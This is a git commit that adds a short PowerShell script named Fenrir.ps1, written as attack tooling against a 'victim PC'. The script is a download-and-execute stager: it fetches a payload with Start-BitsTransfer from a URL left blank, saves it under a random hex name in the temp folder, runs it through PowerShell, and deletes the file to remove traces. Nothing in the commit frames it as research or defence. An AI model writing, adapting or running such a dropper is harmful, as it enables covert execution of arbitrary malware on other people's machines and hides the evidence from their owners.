4fb3765591e4f0644b7a51043d49273ca70fb9e1
DevilZArkbird <36197707+DevilZArkbird@users.noreply.github.com>
2018-03-10 02:12:21 +0100

    Add files via upload

---
+++ Fenrir.ps1
@@ -0,0 +1,15 @@
+﻿#Path of the target to download
+$DownPath=""
+#Select a random value for give a random hex name of the script
+$NumRan=Get-random
+$var=([Convert]::ToString($NumRan, 16))+".ps1"
+#path on the victim PC
+$FilePath= $env:temp+"\"+$var
+#Show the path
+$FilePath
+#Launch the download
+Start-BitsTransfer -Source $DownPath -Destination $FilePath 
+#Go on the Path, execute the payload and clean the payload file 
+Set-Location $env:temp
+".\"+$var |powershell - |Out-null
+Remove-Item "$var"
